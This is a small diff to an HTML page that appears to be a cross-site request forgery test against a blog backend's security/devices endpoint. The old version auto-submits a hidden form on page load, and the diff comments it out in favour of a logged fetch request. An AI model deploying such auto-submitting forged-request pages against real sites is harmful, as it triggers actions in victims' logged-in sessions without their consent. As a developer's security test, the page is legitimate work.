@@ -6,12 +6,13 @@
     <title>Document</title>
 </head>
 <body>
-    <form action="https://blog-nest-raw-sql.onrender.com/api/security/devices" method="POST" id="csrf_form">
+    <!-- <form action="https://blog-nest-raw-sql.onrender.com/api/security/devices" method="GET" id="csrf_form">
         <input type="hidden" name="devices" value="1">
-    </form>
+    </form> -->
 
     <script>
-        document.getElementById('csrf_form').submit();
+        // document.getElementById('csrf_form').submit();
+        fetch('https://blog-nest-raw-sql.onrender.com/api/security/devices').then((data) => console.log(data)).catch((err) => console.log(err));
     </script>
 </body>
 </html>
